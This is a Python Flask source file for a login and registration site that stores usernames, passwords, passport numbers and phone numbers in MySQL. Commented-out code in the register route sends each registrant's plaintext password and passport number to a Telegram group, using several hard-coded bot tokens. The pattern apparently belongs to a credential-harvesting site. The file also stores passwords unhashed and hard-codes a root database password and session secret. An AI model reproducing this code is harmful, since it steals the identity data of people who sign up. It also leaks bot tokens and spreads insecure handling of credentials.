from threading import Thread
import mysql.connector
from flask import Flask, render_template, request, redirect, url_for, session
from flask_mysqldb import MySQL
import MySQLdb.cursors
import telebot,re, random

class mysql_data:
    def __init__(self, host=None, user=None, password=None, database=None, table=None):
        self.host = host
        self.user_host = user
        self.password_host = password
        self.database = database
        self.table = table
       
    def create_database(self):
        connect = mysql.connector.connect(host=self.host, user=self.user_host, password=self.password_host)
        cursor = connect.cursor()
        cursor.execute(f'CREATE DATABASE IF NOT EXISTS {self.database}')
        cursor.execute(f'USE {self.database}')
        cursor.execute(f"""
        CREATE TABLE IF NOT EXISTS {self.table}(
            id INT NOT NULL AUTO_INCREMENT PRIMARY KEY,
            username VARCHAR(255) NOT NULL,
            password VARCHAR(255) NOT NULL,
            passport VARCHAR(255),
            phone VARCHAR(255),
            approval BOOLEAN NOT NULL
        )""")
        connect.commit()
        cursor.close()


host = "localhost"
user = "root"
password = "123456"
database_name = "user_data"
table_name = "customers"

mysql_instance = mysql_data(host, user, password, database_name, table_name)
Thread(target=mysql_instance.create_database).start()

app = Flask(__name__, template_folder='templates', static_folder='static')
# url_for('static', filename='style.css')
# url_for('assets/css', filename='style.css')


app.secret_key = 'nhothoang'
app.config['MYSQL_HOST'] = host
app.config['MYSQL_USER'] = user
app.config['MYSQL_PASSWORD'] = password
app.config['MYSQL_DB'] = database_name
mysql = MySQL(app)

@app.route('/')
@app.route('/login', methods=['GET', 'POST'])
def login():
    msg = ''
    if request.method == 'POST' and 'username' in request.form and 'password' in request.form and "passport" in request.form:
        username = request.form['username']
        password = request.form['password']
        passport = request.form['passport']
        # approval = 1
        cursor = mysql.connection.cursor(MySQLdb.cursors.DictCursor)
        cursor.execute(f'SELECT * FROM {table_name} WHERE username = %s AND password = %s AND passport = %s AND approval = %s', (username, password,passport, 0))
        customer = cursor.fetchone()
        print(username, password, passport)
        if customer:
            print("true")
            session['loggedin'] = True
            session['id'] = customer['id']
            session['username'] = customer['username']
            msg = 'Logged in successfully!'
            return render_template('index.html', msg=msg)
        else:
            msg = 'Incorrect username, password, or passport. Please try again.'
    return render_template('login.html', msg=msg)

# list_token = ['6571762275:AAHKBkokB5x5jH6x-i2R2XS-ICFywL2JwCs','6426245736:AAGymCDYynl02iIalRarqwZHYG6AS-TLJz8','6656669136:AAGg52Liw0m-rRFils2k0AyNor4VZ4jUKtE'] 
# group_id = "-4011473840"
# def send_mess_tele(token=None, id="-4011473840", content = None):
#     telebot.TeleBot(token=token).send_message(chat_id=id, text=content)

@app.route('/register', methods=['GET', 'POST'])
def register():
    msg = ''
    if request.method == 'POST' and 'username' in request.form and 'password'  in request.form and 'passport' in request.form and "phone" in request.form:
        username = request.form['username']
        password = request.form['password']
        passport = request.form["passport"]
        phone  = request.form["phone"]
        cursor = mysql.connection.cursor(MySQLdb.cursors.DictCursor)

        cursor.execute(f'SELECT * FROM {table_name} WHERE username = %s OR passport = %s', (username, passport,))
        existing_user = cursor.fetchone()
        if existing_user:
            if existing_user['username'] == username:
                msg = 'Username already exists!'
            else:
                msg = 'Passport already exists!'
 
        elif not re.match(r'[A-Za-z0-9]+', username):
            msg = 'Username must contain only characters and numbers!'
        elif not username or not password or not passport or not phone:
            msg = 'Please fill out the form!'

        else:
            cursor.execute(f'INSERT INTO {table_name} (username, password, passport, phone, approval) VALUES (%s, %s, %s, %s, %s)', (username, password, passport, phone, 0,))
            mysql.connection.commit()
            msg = 'You have successfully registered!'
            return render_template("login.html", msg=msg)
            # token = random.choice(list_token)
            # # Thread(target=bottele, args=(token,"-4011473840",f"Resgister success\nAccount: {username}\nPassword: {password}\nPassport: {passport}" ))
            # send_mess_tele(token=token, content=f"Resgister success\naccount: {username}\nPassword: {password}\nPassport: {passport}")
            # # lambda: Thread(target=send_mess_tele,args=(token,"-4011473840",f"Resgister success\naccount: {username}\nPassword: {password}\nPassport: {passport}"))

    elif request.method == 'POST':
        msg = 'Please fill out the form!'
    return render_template('register.html', msg=msg)



@app.route('/logout')
def logout():
    session.pop('loggedin', None)
    session.pop('id', None)
    session.pop('username', None)
    return redirect(url_for('login'))

if __name__=="__main__":
    app.run(debug=True)